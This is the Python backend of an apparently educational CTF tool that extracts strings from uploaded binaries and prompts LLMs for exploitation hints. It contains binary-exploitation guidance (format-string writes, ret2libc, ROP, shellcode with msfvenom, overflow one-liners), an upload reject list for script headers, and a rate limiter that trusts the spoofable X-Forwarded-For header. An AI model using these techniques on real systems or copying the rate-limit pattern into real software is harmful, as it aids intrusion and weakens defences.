"""
BinExplain Backend — FastAPI application for static binary analysis.

Security invariants
───────────────────
• Uploaded binaries are NEVER executed.
• Temp files are ALWAYS deleted after processing (try/finally).
• File size AND type are validated BEFORE the file touches disk.
• File contents are NEVER logged.
• Temp files live in the OS temp directory, never in the project tree.
• Only extracted strings (never the binary itself) are sent to Claude.
• The Anthropic API key is read from the ANTHROPIC_API_KEY env var.
• Chat messages are NEVER stored — history lives only in the client.
• Extracted ZIP contents are NEVER executed and are deleted in try/finally.
• VirusTotal API key is read from VIRUSTOTAL_API_KEY env var only.
• File contents sent to VT are NEVER logged — only filename and scan status.
• ZIP passwords are NEVER stored or logged — used only for extraction, then discarded.
"""

import datetime
import logging
import os
os.environ["TOKENIZERS_PARALLELISM"] = "false"
import re
import shutil
import subprocess
import tempfile
import time as _time_module
import zipfile
import asyncio
import concurrent.futures
from pathlib import Path
from dotenv import load_dotenv
load_dotenv(Path(__file__).resolve().parent / ".env")

import anthropic
import groq
import openai
import requests
from google import genai
from google.genai import types
gemini_client = None
from typing import Literal, Optional, Dict, Any, List

from fastapi import FastAPI, File, Form, HTTPException, Request, UploadFile, Body
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import JSONResponse
from pydantic import BaseModel, field_validator
from slowapi import Limiter
from slowapi.errors import RateLimitExceeded
from slowapi.util import get_remote_address

import sentry_sdk
from sentry_sdk.integrations.fastapi import FastApiIntegration

SENTRY_DSN = os.getenv("SENTRY_DSN", "")
if SENTRY_DSN:
    sentry_sdk.init(
        dsn=SENTRY_DSN,
        integrations=[FastApiIntegration()],
        traces_sample_rate=0.1,
        environment="production"
    )
    print("[BinExplain] Sentry error monitoring active")
else:
    print("[BinExplain] Sentry DSN not set - error monitoring disabled")

# ---------------------------------------------------------------------------
# Analytics & feedback logging
# ---------------------------------------------------------------------------
def log_analytics(
    filename: str,
    category: str,
    difficulty: str,
    rag_hits: int,
    provider_used: str,
) -> None:
    """Append one line to logs/analytics.log for each successful analysis."""
    os.makedirs("logs", exist_ok=True)
    with open("logs/analytics.log", "a", encoding="utf-8") as f:
        f.write(
            f"{datetime.datetime.now().isoformat()} | {filename} | "
            f"{category} | {difficulty} | {rag_hits} | {provider_used}\n"
        )


def log_feedback(
    filename: str,
    category: str,
    provider: str,
    is_positive: bool,
) -> None:
    """Append one line to logs/feedback.log for each feedback vote."""
    os.makedirs("logs", exist_ok=True)
    with open("logs/feedback.log", "a", encoding="utf-8") as f:
        sentiment = "positive" if is_positive else "negative"
        f.write(
            f"{datetime.datetime.now().isoformat()} | {filename} | "
            f"{category} | {provider} | {sentiment}\n"
        )


def _is_testing() -> bool:
    import sys
    return "pytest" in sys.modules or os.environ.get("TESTING") == "true"

_kb_scheduler = None
ctf_knowledge = None
try:
    if _is_testing():
        print("[BinExplain] Testing mode: Skipping CTF Knowledge Base startup")
        ctf_knowledge = None
    else:
        from knowledge_base.rag_engine import CTFKnowledgeBase
        ctf_knowledge = CTFKnowledgeBase()
        ctf_knowledge.load_all_walkthroughs()
        print("[BinExplain] CTF Knowledge Base ready")
        # Start auto-refresh scheduler (every 24 hours)
        from knowledge_base.scheduler import start_scheduler
        _kb_scheduler = start_scheduler()
except Exception as e:
    print(f"[BinExplain] Knowledge base unavailable: {e}")
    ctf_knowledge = None

# ---------------------------------------------------------------------------
# Cache Augmented Generation (CAG)
# ---------------------------------------------------------------------------
from cache import hint_cache as _hint_cache


def _prewarm_cache() -> None:
    """Pre-generate cached hints for the 6 most common CTF patterns.

    Only runs when the cache is completely empty (first launch).
    Uses the real LLM pipeline so that subsequent requests for these
    common patterns are served instantly.
    """
    stats = _hint_cache.get_stats()
    if stats["total_cached"] > 0:
        print(f"[CAG] Cache already populated ({stats['total_cached']} entries) — skipping pre-warm")
        return

    PREWARM_PATTERNS = [
        {
            "category": "format_string",
            "checksec": {"nx": True, "pie": True, "canary": False},
            "dangerous": ["printf"],
            "strings": ["printf", "%s", "%p", "flag.txt"],
            "patterns": {"dangerous_functions": ["printf"]},
        },
        {
            "category": "ret2win",
            "checksec": {"nx": True, "pie": False, "canary": False},
            "dangerous": ["gets"],
            "strings": ["gets", "flag.txt", "You win!"],
            "patterns": {"dangerous_functions": ["gets"], "win_conditions": ["You win!"], "flag_reads": ["flag.txt"]},
        },
        {
            "category": "ret2libc",
            "checksec": {"nx": True, "pie": False, "canary": False},
            "dangerous": ["system"],
            "strings": ["system", "/bin/sh", "gets"],
            "patterns": {"dangerous_functions": ["system", "gets"]},
        },
        {
            "category": "heap_exploitation",
            "checksec": {"nx": True, "pie": False, "canary": False},
            "dangerous": ["free", "malloc"],
            "strings": ["malloc", "free", "1) Create", "2) Delete"],
            "patterns": {"dangerous_functions": ["malloc", "free"], "memory_functions": ["malloc", "free"]},
        },
        {
            "category": "rop_chain",
            "checksec": {"nx": True, "pie": False, "canary": False},
            "dangerous": [],
            "strings": ["gets", "Enter input:"],
            "patterns": {"dangerous_functions": ["gets"]},
        },
        {
            "category": "shellcode",
            "checksec": {"nx": False, "pie": False, "canary": False},
            "dangerous": [],
            "strings": ["gets", "Enter shellcode:"],
            "patterns": {"dangerous_functions": ["gets"]},
        },
    ]

    print("[CAG] Cache is empty — pre-warming with 6 common patterns...")
    for pw in PREWARM_PATTERNS:
        key = _hint_cache.generate_key(pw["category"], pw["checksec"], pw["dangerous"])
        try:
            # Build a minimal category dict for the hint generator
            cat_dict = {"category": pw["category"], "confidence": "High", "explanation": "Pre-warm"}
            hints = get_ai_hints(
                pw["strings"], pw["patterns"], "",
                ctf_category=cat_dict,
                checksec=pw["checksec"],
                _skip_cache=True,  # avoid infinite recursion
            )
            # Extract kill chain section
            kill_chain = ""
            if "Kill Chain" in hints:
                kill_chain = hints.split("Kill Chain", 1)[1].split("\n\n", 1)[0] if "Kill Chain" in hints else ""
            _hint_cache.set(key, hints, kill_chain, pw["category"])
            print(f"[CAG]   Pre-warmed: {key}")
        except Exception as exc:
            print(f"[CAG]   Pre-warm failed for {key}: {exc}")

    final_stats = _hint_cache.get_stats()
    print(f"[CAG] Pre-warm complete — {final_stats['total_cached']} entries cached")


# Run pre-warm in a background thread so it doesn't block startup
if not _is_testing():
    import threading as _cag_threading
    _cag_threading.Thread(target=_prewarm_cache, daemon=True).start()
else:
    print("[CAG] Testing mode — skipping pre-warm")

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
MAX_FILE_SIZE = 5 * 1024 * 1024  # 5 MB
MAX_ZIP_SIZE = 10 * 1024 * 1024  # 10 MB for ZIP archives
MAX_ZIP_FILES = 20              # zip-bomb protection
ALLOWED_EXTENSIONS: set[str] = {
    ".bin", ".elf", ".exe",
    ".so", ".dll", ".out", ".o",  # additional binary formats
    ".zip",                       # archive support
}
MIN_STRING_LENGTH = 4  # minimum printable-ASCII run to extract
MAX_STRINGS_FOR_AI = 100  # cap strings sent to Claude to avoid token abuse
MAX_CHAT_MESSAGES = 10    # max conversation turns kept per request
MAX_CHAT_CHARS = 2000     # max characters per single chat message
MAX_SOURCE_CODE_CHARS = 10000  # max characters for source code analysis
SOURCE_CODE_EXTENSIONS: set[str] = {
    ".c", ".cpp", ".h", ".hpp",  # C/C++
    ".py",                        # Python
    ".js",                        # JavaScript
    ".rs",                        # Rust
    ".go",                        # Go
    ".java",                      # Java
}

OLLAMA_BASE_URL = os.environ.get("OLLAMA_BASE_URL", "http://localhost:11434")
OLLAMA_MODELS = ["llama3.2", "qwen2.5-coder", "qwen2.5"]

# ---------------------------------------------------------------------------
# Provider cooldown tracking (30-second window per provider after rate limit)
# ---------------------------------------------------------------------------
_provider_cooldowns: dict[str, float] = {}  # provider_name -> timestamp of last 429
PROVIDER_COOLDOWN_SECONDS = 30


def _record_provider_cooldown(provider: str) -> None:
    """Record that a provider hit a rate limit right now."""
    _provider_cooldowns[provider] = _time_module.time()


def _is_provider_cooled_down(provider: str) -> bool:
    """Return True if the provider is NOT in cooldown (i.e., ready to use)."""
    last_fail = _provider_cooldowns.get(provider, 0)
    return (_time_module.time() - last_fail) > PROVIDER_COOLDOWN_SECONDS

ANTHROPIC_API_KEY = os.environ.get("ANTHROPIC_API_KEY") or ""
GROQ_API_KEY = os.environ.get("GROQ_API_KEY") or ""
OPENAI_API_KEY = os.environ.get("OPENAI_API_KEY") or ""
GEMINI_API_KEY = os.environ.get("GEMINI_API_KEY") or ""
VIRUSTOTAL_API_KEY = os.environ.get("VIRUSTOTAL_API_KEY") or ""

# CORS: read allowed origins from env (comma-separated), default to localhost
_raw_origins = os.environ.get("ALLOWED_ORIGINS", "http://localhost:5173")
ALLOWED_ORIGINS = [o.strip() for o in _raw_origins.split(",") if o.strip()]

# ── Startup debug: confirm API key status ─────────────────────────────
if ANTHROPIC_API_KEY:
    print(f"[BinExplain] ANTHROPIC_API_KEY loaded (OK)  (length={len(ANTHROPIC_API_KEY)})")
else:
    print("[BinExplain] WARNING: ANTHROPIC_API_KEY is NOT set -- Claude hints will be disabled")

if GROQ_API_KEY:
    print(f"[BinExplain] GROQ_API_KEY loaded (OK)  (length={len(GROQ_API_KEY)})")
else:
    print("[BinExplain] WARNING: GROQ_API_KEY is NOT set -- Groq fallback will be disabled")

if OPENAI_API_KEY:
    print(f"[BinExplain] OPENAI_API_KEY loaded (OK)  (length={len(OPENAI_API_KEY)})")
else:
    print("[BinExplain] WARNING: OPENAI_API_KEY is NOT set -- GPT-4o fallback will be disabled")

if GEMINI_API_KEY:
    print(f"[BinExplain] GEMINI_API_KEY loaded (OK)  (length={len(GEMINI_API_KEY)})")
    try:
        gemini_client = genai.Client(api_key=GEMINI_API_KEY)
    except Exception as exc:
        print(f"[BinExplain] ERROR: Gemini client failed to initialize: {exc}")
else:
    print("[BinExplain] WARNING: GEMINI_API_KEY is NOT set -- Gemini fallback will be disabled")

if VIRUSTOTAL_API_KEY:
    print(f"[BinExplain] VIRUSTOTAL_API_KEY loaded (OK)  (length={len(VIRUSTOTAL_API_KEY)})")
else:
    print("[BinExplain] WARNING: VIRUSTOTAL_API_KEY is NOT set -- VirusTotal scanning disabled")

# ---------------------------------------------------------------------------
# Category-specific guidance for AI prompts
# ---------------------------------------------------------------------------
CATEGORY_SPECIFIC_GUIDANCE: dict[str, str] = {
    "format_string": (
        "If FORMAT STRING:\n"
        "- Focus on: %p leaks, %x leaks, finding offset with %1$p %2$p etc, %n writes, GOT overwrite\n"
        "- Key commands: python3 -c 'print(\"%p.\"*20)' | ./binary, pwntools fmtstr_payload()\n"
        "- Never mention: cyclic(), overflow offsets, ret2libc unless also detected\n"
    ),
    "ret2win": (
        "If RET2WIN:\n"
        "- Focus on: finding win function address, calculating overflow offset with cyclic, redirecting return address\n"
        "- Key commands: cyclic(200), cyclic_find(), p64(elf.sym['win'])\n"
        "- Never mention: format string techniques, heap techniques\n"
    ),
    "ret2libc": (
        "If RET2LIBC:\n"
        "- Focus on: finding system(), /bin/sh string, ret2libc chain, libc leak\n"
        "- Key commands: ROPgadget, one_gadget, pwntools ret2libc\n"
        "- Never mention: format string, heap techniques\n"
    ),
    "heap_exploitation": (
        "If HEAP_EXPLOITATION:\n"
        "- Focus on: malloc/free patterns, UAF, tcache poisoning, heap spray\n"
        "- Key commands: ltrace for heap operations, pwndbg heap commands\n"
        "- Never mention: stack overflow offsets, format string\n"
    ),
    "rop_chain": (
        "If ROP_CHAIN:\n"
        "- Focus on: finding gadgets, building ROP chain, defeating NX\n"
        "- Key commands: ROPgadget, pwntools ROP(), ret2plt\n"
        "- Never mention: format string, heap techniques\n"
    ),
    "shellcode": (
        "If SHELLCODE:\n"
        "- Focus on: writing shellcode, finding executable memory, jumping to shellcode\n"
        "- Key commands: pwntools shellcraft, msfvenom\n"
        "- Never mention: format string, ROP (NX is disabled)\n"
    ),
    "stack_canary_bypass": (
        "If STACK_CANARY_BYPASS:\n"
        "- Focus on: leaking canary via format string or brute force, then overflowing past it\n"
        "- Key commands: %p leaks to find canary position, reconstruct canary, overflow after canary\n"
        "- Never mention: heap techniques\n"
    ),
}


def build_category_aware_prompt(base_prompt: str, ctf_category: str) -> str:
    """
    Build a system prompt with strict category-specific rules injected.

    Parameters:
        base_prompt:  The base AI system prompt (hints or chat style).
        ctf_category: The detected CTF category string (e.g. 'format_string',
                      'ret2win').  If empty or 'unknown', no category rules
                      are added.

    Returns:
        The complete system prompt with category guidance appended.
    """
    if not ctf_category or ctf_category == "unknown":
        return base_prompt

    category_block = CATEGORY_SPECIFIC_GUIDANCE.get(ctf_category, "")

    category_rules = (
        f"\n\nThe binary has been classified as: {ctf_category.upper()}\n\n"
        "STRICT RULES:\n"
        "- ONLY give advice relevant to the detected CTF category\n"
        "- Never mix vulnerability types\n"
        "- If the user asks about something outside the category, gently redirect them\n\n"
        "CATEGORY-SPECIFIC GUIDANCE:\n"
    )
    if category_block:
        category_rules += category_block
    else:
        category_rules += f"- Focus exclusively on {ctf_category} techniques\n"

    category_rules += (
        "\nALWAYS:\n"
        "- Reference specific function names found in THIS binary\n"
        "- Use the actual binary filename in commands\n"
        "- Build on previous conversation — never repeat advice already given\n"
        "- Keep responses focused: 3-5 sentences max\n"
        "- End with one specific actionable command\n"
    )

    return base_prompt + category_rules


AI_SYSTEM_PROMPT = (
    "You are an expert CTF mentor helping a beginner solve a binary exploitation challenge. "
    "Given extracted strings and patterns from a binary, respond using ONLY the format below.\n\n"
    "ABSOLUTE RULES — you must follow every single one:\n"
    "1. Start with • bullet points. ZERO prose, ZERO paragraphs, ZERO introductions or conclusions.\n"
    "2. NEVER use markdown headers (#), numbered lists (1. 2. 3.), bold (**), italic (*), or any markdown formatting.\n"
    "3. Each • bullet = one specific action + the exact Linux command to run. No bullet without a command.\n"
    "4. Maximum 5 • bullets. Each bullet is 1 sentence, 2 sentences absolute max.\n"
    "5. After the • bullets, add a blank line then \"🔗 Kill Chain:\" followed by 2-3 • bullets explaining: "
    "(a) what the binary is likely trying to do based on the strings/patterns, "
    "(b) what the attacker's goal appears to be, "
    "(c) the likely exploitation path for a CTF player.\n"
    "6. Your LAST line must be exactly: 🔥 Try this first: <the single most important command to run>\n"
    "7. Do NOT write anything before the first • or after the 🔥 line.\n\n"
    "EXAMPLE (follow this format exactly):\n"
    "• Run `checksec ./binary` to see if NX, PIE, or stack canaries are enabled.\n"
    "• The binary uses `gets()` — test for overflow with `python3 -c 'print(\"A\"*100)' | ./binary`.\n"
    "• List all functions with `objdump -d binary | grep '<' | head -20` to find win/flag functions.\n"
    "• Search for flag strings with `strings binary | grep -i flag`.\n\n"
    "🔗 Kill Chain:\n"
    "• Binary reads flag.txt — goal is to trigger the win condition that prints the flag.\n"
    "• fgets() with no bounds check suggests a buffer overflow path.\n"
    "• Likely exploit: overflow buffer → overwrite return address → redirect to win function.\n\n"
    "🔥 Try this first: `checksec ./binary`"
)

EXPLAIN_COMMAND_SYSTEM_PROMPT = (
    "You are a CTF mentor. Explain what this command does in simple terms for a beginner. "
    "Include: what it does, why it's useful, what output to expect, and what to look for in the output. "
    "Use bullet points only. Max 5 bullets."
)

CHAT_SYSTEM_PROMPT = (
    "You are an expert CTF mentor and binary exploitation specialist. "
    "You are helping a student solve a CTF challenge.\n\n"
    "You have full context of the binary they uploaded. Always reference specific details from their binary.\n\n"
    "RESPONSE FORMAT (follow this EXACTLY every time):\n"
    "1. Start with a one-line summary of what you're doing or suggesting\n"
    "2. Use bullet points with the bullet character for each step (max 4-5 bullets)\n"
    "3. For commands, ALWAYS wrap them in backtick code blocks like `command here`\n"
    "4. For multi-line payloads or scripts, use triple-backtick code blocks:\n"
    "```python\n"
    "code here\n"
    "```\n"
    "5. End EVERY response with: **Next:** one sentence about what to do after this\n\n"
    "RULES:\n"
    "- Never repeat the same command twice in a conversation\n"
    "- Read the conversation history and build on previous messages\n"
    "- If they say something didn't work, acknowledge it and give a DIFFERENT approach\n"
    "- If the previous approach isn't working after 2 attempts, say \"Let's try a different approach:\" and suggest something completely different\n"
    "- If they ask a conceptual question (what is X), explain it clearly with examples\n"
    "- If they ask for next steps, give ONE specific step with exact command for their binary\n"
    "- Use their actual binary name, actual function names, actual addresses in your response\n"
    "- Be encouraging but honest -- if something is hard, say so\n"
    "- Keep responses focused -- max 4-5 bullet points\n"
    "- Never say 'run man command' -- always explain directly\n"
    "- Never give generic advice that ignores the binary context\n"
    "- If you detect the user has been trying the same type of thing 3+ times with no progress, "
    "automatically say: \"This approach doesn't seem to be working. Let's try something completely different:\" "
    "and suggest a fresh angle based on the CTF category"
)

SOURCE_CODE_SYSTEM_PROMPT = (
    "You are a security-focused code reviewer and CTF mentor helping beginners analyze source code "
    "for vulnerabilities.\n\n"
    "Given source code, respond using ONLY the format below.\n\n"
    "ABSOLUTE RULES — you must follow every single one:\n"
    "1. Start with a single line: LANGUAGE: <detected language>\n"
    "2. Then a blank line, then VULNERABILITIES: on its own line, followed by • bullet points.\n"
    "   Each • bullet = one vulnerability with the line number(s) if identifiable, what's wrong, and why it's dangerous.\n"
    "   Maximum 8 bullets. If no vulnerabilities found, write: • No obvious vulnerabilities detected.\n"
    "3. Then a blank line, then DANGEROUS FUNCTIONS: on its own line, followed by • bullet points.\n"
    "   Each • lists a dangerous function call found and why it's risky.\n"
    "   Maximum 6 bullets. If none found, write: • No dangerous function calls detected.\n"
    "4. Then a blank line, then CTF HINTS: on its own line, followed by • bullet points.\n"
    "   Each • = one specific actionable hint for a CTF player (how to exploit, what to look for).\n"
    "   Maximum 5 bullets.\n"
    "5. Then a blank line, then NEXT STEPS: on its own line, followed by • bullet points.\n"
    "   Each • = one concrete command or action to take next, with examples.\n"
    "   Maximum 4 bullets.\n"
    "6. NEVER use markdown headers (#), numbered lists (1. 2. 3.), bold (**), or italic (*).\n"
    "7. Do NOT write anything before LANGUAGE: or any prose paragraphs anywhere.\n\n"
    "EXAMPLE (follow this format exactly):\n"
    "LANGUAGE: C\n\n"
    "VULNERABILITIES:\n"
    "• Line 12: gets(buffer) — unbounded read into stack buffer, classic buffer overflow.\n"
    "• Line 18: strcpy(dest, src) — no bounds checking, can overflow dest.\n"
    "• Line 25: printf(user_input) — format string vulnerability, attacker can read/write memory.\n\n"
    "DANGEROUS FUNCTIONS:\n"
    "• gets() — never use, no way to limit input length.\n"
    "• system() — executes shell commands, can be hijacked via buffer overflow.\n\n"
    "CTF HINTS:\n"
    "• The buffer on line 12 is 64 bytes — overflow it to overwrite the return address.\n"
    "• Look for a win() function that reads flag.txt — redirect execution there.\n"
    "• The format string on line 25 can leak stack addresses with %p.\n\n"
    "NEXT STEPS:\n"
    "• Compile with: gcc -fno-stack-protector -no-pie -o vuln vuln.c\n"
    "• Test overflow: python3 -c 'print(\"A\"*100)' | ./vuln\n"
    "• Find offset: cyclic 100 | ./vuln then cyclic -l <crash_value>\n"
)

logger = logging.getLogger("binexplain")


# ---------------------------------------------------------------------------
# Chat request models
# ---------------------------------------------------------------------------
class ChatMessage(BaseModel):
    role: Literal["user", "assistant"]
    content: str

    @field_validator("content")
    @classmethod
    def cap_content_length(cls, v: str) -> str:
        if not v.strip():
            raise ValueError("Message content is empty.")
        if len(v) > MAX_CHAT_CHARS:
            raise ValueError(f"Message content exceeds {MAX_CHAT_CHARS} character limit.")
        return v


class ChatRequest(BaseModel):
    messages: list[ChatMessage]
    context: str = ""
    ctf_category: str = ""
    binary_context: Optional[Dict[str, Any]] = None
    tried_commands: Optional[List[str]] = []

class ExplainCommandRequest(BaseModel):
    command: str
    context: str = ""

    @field_validator("command")
    @classmethod
    def validate_command(cls, v: str) -> str:
        if len(v) > 500:
            raise ValueError("Command exceeds 500 character limit.")
        if not v.strip():
            raise ValueError("Command is empty.")
        return v


class CodeAnalysisRequest(BaseModel):
    code: str
    filename: str = ""

    @field_validator("code")
    @classmethod
    def validate_code(cls, v: str) -> str:
        if len(v) > MAX_SOURCE_CODE_CHARS:
            raise ValueError(f"Source code exceeds {MAX_SOURCE_CODE_CHARS} character limit.")
        if not v.strip():
            raise ValueError("Source code is empty.")
        return v

    @field_validator("filename")
    @classmethod
    def cap_filename(cls, v: str) -> str:
        return v[:200]

# Expected magic-byte prefixes for known binary formats
FILE_SIGNATURES: dict[str, bytes] = {
    ".elf": b"\x7fELF",
    ".exe": b"MZ",
    ".so":  b"\x7fELF",   # shared libraries are ELF
    ".dll": b"MZ",        # Windows DLLs use PE/MZ
}

# Magic bytes used for auto-detecting extensionless files
MAGIC_BYTE_MAP: list[tuple[bytes, str]] = [
    (b"\x7fELF",         "ELF"),
    (b"MZ",              "PE"),
    (b"\xcf\xfa\xed\xfe", "Mach-O (64-bit)"),
    (b"\xce\xfa\xed\xfe", "Mach-O (32-bit)"),
    (b"\xfe\xed\xfa\xcf", "Mach-O (64-bit, big-endian)"),
    (b"\xfe\xed\xfa\xce", "Mach-O (32-bit, big-endian)"),
]

# If an alleged .bin file starts with any of these, reject it —
# the file is likely a script or markup masquerading as a binary.
SUSPICIOUS_HEADERS: list[bytes] = [
    b"#!",          # shell / script shebang
    b"<html",       # HTML
    b"<!doctype",   # HTML doctype
    b"<script",     # JavaScript / XSS payload
    b"<?php",       # PHP
    b"<%",          # ASP / JSP
    b"<?xml",       # XML
    b"{\n",         # JSON
    b"[",           # JSON array
]

# ---------------------------------------------------------------------------
# Application & middleware
# ---------------------------------------------------------------------------
def get_ipaddr(request: Request) -> str:
    """Get the real client IP, respecting X-Forwarded-For if behind a proxy."""
    if "x-forwarded-for" in request.headers:
        return request.headers["x-forwarded-for"].split(",")[0].strip()
    if not request.client or not request.client.host:
        return "127.0.0.1"
    return request.client.host

limiter = Limiter(key_func=get_ipaddr)

app = FastAPI(
    title="BinExplain API",
    description="Static analysis of binary files — extract readable strings without executing anything.",
    version="0.1.0",
)

app.state.limiter = limiter


@app.exception_handler(RateLimitExceeded)
async def _rate_limit_handler(request: Request, exc: RateLimitExceeded):
    return JSONResponse(
        status_code=429,
        content={"detail": "Rate limit exceeded. Maximum 10 requests per IP per hour."},
    )


app.add_middleware(
    CORSMiddleware,
    allow_origins=ALLOWED_ORIGINS,
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)


# ---------------------------------------------------------------------------
# Validation helpers
# ---------------------------------------------------------------------------
def _validate_extension(filename: str | None) -> str:
    """
    Return the lower-cased extension, or '' for extensionless files.
    Raises HTTP 400 for unsupported extensions.
    """
    if not filename:
        raise HTTPException(status_code=400, detail="Filename is missing from the upload.")
    ext = Path(filename).suffix.lower()
    # Extensionless files are allowed — they'll be auto-detected via magic bytes
    if ext == "":
        return ext
    if ext not in ALLOWED_EXTENSIONS:
        raise HTTPException(
            status_code=400,
            detail=(
                f"Extension '{ext}' is not allowed. "
                f"Accepted: {', '.join(sorted(ALLOWED_EXTENSIONS))} or no extension (auto-detect)."
            ),
        )
    return ext


def _validate_size(content: bytes, *, is_zip: bool = False) -> None:
    """Reject files that exceed the size cap or are empty."""
    if len(content) == 0:
        raise HTTPException(status_code=400, detail="Uploaded file is empty.")
    limit = MAX_ZIP_SIZE if is_zip else MAX_FILE_SIZE
    if len(content) > limit:
        raise HTTPException(
            status_code=413,
            detail=f"File exceeds the {limit // (1024 * 1024)} MB size limit.",
        )


def _detect_type_from_magic(content: bytes) -> str:
    """
    Auto-detect a binary's type from its magic bytes.
    Returns a human-readable type string (e.g. 'ELF', 'PE').
    Raises HTTP 400 if the file cannot be identified.
    """
    for magic, label in MAGIC_BYTE_MAP:
        if content[:len(magic)] == magic:
            return label
    raise HTTPException(
        status_code=400,
        detail=(
            "Cannot identify file type — no known magic bytes found. "
            "Supported formats: ELF (Linux binaries), PE/MZ (Windows .exe/.dll), "
            "Mach-O (macOS binaries). Try uploading with an explicit extension "
            f"({', '.join(sorted(ALLOWED_EXTENSIONS))})."
        ),
    )


def _validate_mime(content: bytes, ext: str) -> None:
    """
    Lightweight content-sniffing: verify the file's magic bytes match the
    declared extension and reject anything that looks like a script/markup.
    """
    # ZIP files have their own signature check
    if ext == ".zip":
        if not content.startswith(b"PK"):
            raise HTTPException(
                status_code=400,
                detail="File does not appear to be a valid ZIP archive.",
            )
        return

    # For formats with known signatures, the header MUST match.
    if ext in FILE_SIGNATURES:
        expected = FILE_SIGNATURES[ext]
        if not content[: len(expected)] == expected:
            raise HTTPException(
                status_code=400,
                detail=f"File content does not match the expected signature for '{ext}'.",
            )
        return

    # For generic .bin / .out / .o / extensionless — reject obvious non-binary content.
    header = content[:64].lower()
    for sig in SUSPICIOUS_HEADERS:
        if header.startswith(sig):
            raise HTTPException(
                status_code=400,
                detail="File appears to be a script or markup file, not a binary.",
            )




# ---------------------------------------------------------------------------
# Encoding detection
# ---------------------------------------------------------------------------
_BASE64_RE = re.compile(r'[A-Za-z0-9+/]{20,}={0,2}')
_HEX_RE = re.compile(r'[0-9a-fA-F]{16,}')
_XOR_KEYWORDS = ("xor", "key", "encrypt", "decode", "cipher", "crypt")


def detect_encodings(strings: list[str]) -> dict[str, list[str]]:
    """
    Scan extracted strings for potential encoded or obfuscated data.

    Detects:
    • Base64 patterns (20+ chars of Base64 alphabet)
    • Long hex strings (16+ hex chars)
    • XOR / encryption hints (keywords)
    • ROT13 — applies ROT13 to each string, flags if result contains
      'flag' or 'ctf' (hidden flags)

    Returns a dict mapping category → list of matching strings.
    """
    import codecs

    encodings: dict[str, list[str]] = {
        "base64": [],
        "hex_strings": [],
        "xor_hints": [],
        "rot13_flags": [],
    }

    for s in strings:
        # Base64 patterns
        for m in _BASE64_RE.finditer(s):
            match = m.group()
            # Filter out strings that are purely hex (overlap with hex detector)
            if not all(c in '0123456789abcdefABCDEF' for c in match.rstrip('=')):
                encodings["base64"].append(match[:80])  # truncate long matches

        # Hex strings
        for m in _HEX_RE.finditer(s):
            encodings["hex_strings"].append(m.group()[:64])

        # XOR / encryption hints
        s_lower = s.lower()
        if any(kw in s_lower for kw in _XOR_KEYWORDS):
            encodings["xor_hints"].append(s)

        # ROT13 hidden flags
        try:
            rotated = codecs.decode(s, "rot_13")
            if "flag" in rotated.lower() or "ctf" in rotated.lower():
                encodings["rot13_flags"].append(f"{s} → ROT13 → {rotated}")
        except Exception:
            pass

    # Deduplicate and cap
    for key in encodings:
        encodings[key] = list(dict.fromkeys(encodings[key]))[:20]

    # Remove empty categories
    return {k: v for k, v in encodings.items() if v}


# ---------------------------------------------------------------------------
# Encoding detection helpers (URL/IP regexes kept for detect_encodings)
# ---------------------------------------------------------------------------
_IP_RE = re.compile(r'\b(?:\d{1,3}\.){3}\d{1,3}\b')
_URL_RE = re.compile(r'https?://[^\s\x00]+', re.IGNORECASE)
_FORMAT_STRING_RE = re.compile(r'%[0-9]*[nxspdl]', re.IGNORECASE)




# ---------------------------------------------------------------------------
# String extraction
# ---------------------------------------------------------------------------
def _extract_strings_python(data: bytes, min_len: int = MIN_STRING_LENGTH) -> list[str]:
    """
    Pure-Python fallback that replicates the basic behaviour of the Unix
    `strings` utility: find runs of >= *min_len* printable ASCII characters.
    """
    pattern = rb"[\x20-\x7e]{" + str(min_len).encode() + rb",}"
    return [m.decode("ascii", errors="replace") for m in re.findall(pattern, data)]


def _run_strings(filepath: str) -> list[str]:
    """
    Run the system `strings` command on *filepath*.
    Falls back to the pure-Python extractor if the command is unavailable
    or times out.

    ⚠  This function ONLY reads the file — it never executes it.
    """
    try:
        result = subprocess.run(
            ["strings", filepath],
            capture_output=True,
            text=True,
            timeout=30,
        )
        if result.returncode == 0:
            return [line for line in result.stdout.splitlines() if line.strip()]
    except FileNotFoundError:
        pass  # `strings` is not installed on this system
    except subprocess.TimeoutExpired:
        pass  # analysis took too long — fall back

    # Fallback: extract strings in pure Python
    with open(filepath, "rb") as fh:
        data = fh.read()
    return _extract_strings_python(data)


# ---------------------------------------------------------------------------
# Pattern detection
# ---------------------------------------------------------------------------
def detect_patterns(strings: list[str]) -> dict[str, list[str]]:
    """
    Scan extracted strings and tag interesting findings for CTF analysis.
    Returns a dict mapping category names to lists of matching strings.
    """
    patterns: dict[str, list[str]] = {
        "flag_reads": [],
        "win_conditions": [],
        "dangerous_functions": [],
        "memory_functions": [],
        "stack_protection": [],
        "menu_driven": [],
        "glibc_versions": [],
        "file_operations": [],
    }

    win_keywords = ("you win", "correct", "success", "congratulations")
    dangerous_funcs = ("gets", "strcpy", "sprintf", "system", "exec")
    memory_funcs = ("malloc", "free", "realloc")
    file_ops = ("fopen", "fread", "fclose")
    menu_indicators = ("1)", "2)", "option", "menu")

    for s in strings:
        s_lower = s.lower()

        # Flag file reads
        if "flag" in s_lower:
            patterns["flag_reads"].append(s)

        # Win conditions
        if any(kw in s_lower for kw in win_keywords):
            patterns["win_conditions"].append(s)

        # Dangerous functions
        for func in dangerous_funcs:
            if func in s:
                patterns["dangerous_functions"].append(s)
                break

        # Memory functions (hint at heap vulns)
        for func in memory_funcs:
            if func in s:
                patterns["memory_functions"].append(s)
                break

        # Stack protection
        if "__stack_chk_fail" in s:
            patterns["stack_protection"].append(s)

        # Menu-driven programs
        if any(ind in s_lower for ind in menu_indicators):
            patterns["menu_driven"].append(s)

        # GLIBC versions
        if "GLIBC" in s:
            patterns["glibc_versions"].append(s)

        # File operations
        for func in file_ops:
            if func in s:
                patterns["file_operations"].append(s)
                break

    # Remove empty categories for a cleaner response
    return {k: v for k, v in patterns.items() if v}


# ---------------------------------------------------------------------------
# CTF flag detection
# ---------------------------------------------------------------------------
def detect_flags(strings: list[str]) -> list[str]:
    """
    Scan extracted strings for CTF flag formats using regex.
    Detects 10 named formats plus a generic [A-Z0-9]{2,8}\\{...} pattern.
    Returns a deduplicated list of all matches found.
    """
    FLAG_PATTERNS = [
        r'flag\{[^}]+\}',
        r'CTF\{[^}]+\}',
        r'picoCTF\{[^}]+\}',
        r'HTB\{[^}]+\}',
        r'THM\{[^}]+\}',
